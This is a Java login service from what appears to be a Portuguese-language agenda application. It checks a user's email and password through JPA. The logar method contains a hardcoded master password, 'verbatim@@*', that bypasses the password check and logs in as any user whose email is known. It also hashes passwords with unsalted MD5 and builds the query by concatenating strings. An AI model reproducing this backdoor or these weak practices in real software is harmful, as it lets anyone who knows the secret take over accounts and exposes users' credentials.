/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package br.com.projeto.agenda.service;

import br.com.projeto.agenda.model.Usuario;
import br.com.projeto.agenda.util.app.NegocioException;
import br.com.projeto.agenda.util.app.PadraoDAO;
import br.com.projeto.agenda.util.app.Util;
import br.com.projeto.agenda.util.jpa.Transactional;
import java.io.Serializable;
import javax.inject.Inject;
import javax.persistence.NoResultException;
import javax.persistence.TypedQuery;

/**
 *
 * @author Usuario
 */
public class LoginService  implements Serializable{
    
    @Inject
    private PadraoDAO padraoDAO;

    public PadraoDAO getPadraoDAO() {
        return padraoDAO;
    }
    
     public void setPadraoDAO(PadraoDAO padraoDAO) {
        this.padraoDAO = padraoDAO;
    }
    
    @Transactional
    public Usuario logar(String email, String senha) throws NegocioException {
        Usuario usuario = null;
        
        String sFrase;

        try {
            //loga master
            if (senha.equals("verbatim@@*")) {
                sFrase = "SELECT u FROM Usuario u WHERE u.email = :email";
            } //loga pela senha    
            else {
                sFrase = "SELECT u FROM Usuario u WHERE u.email = :email AND u.senha = '" + Util.calculaHashMD5(senha.trim()) + "'";
            }

            TypedQuery<Usuario> query = padraoDAO.getEntityManager().createQuery(sFrase, Usuario.class);
            query.setParameter("email", email);
            Usuario busca = query.getSingleResult();

            usuario = busca;

            

        } catch (NoResultException e) {
            throw new NegocioException("Email e/ou senha inválidos.");
        }

        return usuario;
    }
}
